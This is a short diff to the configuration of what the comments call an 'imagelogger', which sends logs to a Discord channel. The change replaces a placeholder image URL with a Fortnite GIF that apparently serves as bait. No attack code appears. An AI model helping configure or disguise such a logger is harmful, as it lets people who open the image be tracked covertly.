@@ -18,7 +18,7 @@ config = {
     # BASE CONFIG #
     "bot_token": os.getenv("DISCORD_BOT_TOKEN"), # Discord bot token from .env file
     "channel_id": int(os.getenv("DISCORD_CHANNEL_ID", "0")), # Channel ID where logs will be sent
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2F4.bp.blogspot.com%2F-QekhFVvasEo%2FWuxsA5IeXdI%2FAAAAAAAACJc%2FUENf5GA0husrI2PSWk1ODbEGB562D8aQgCLcBGAs%2Fs1600%2FFortnite%252Bgif%252B2.gif&f=1&nofb=1&ipt=227ec48fca5cea4f6b4e0deaca0f7dda4e76e0d34e0fe39daa7673c815010dfd", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
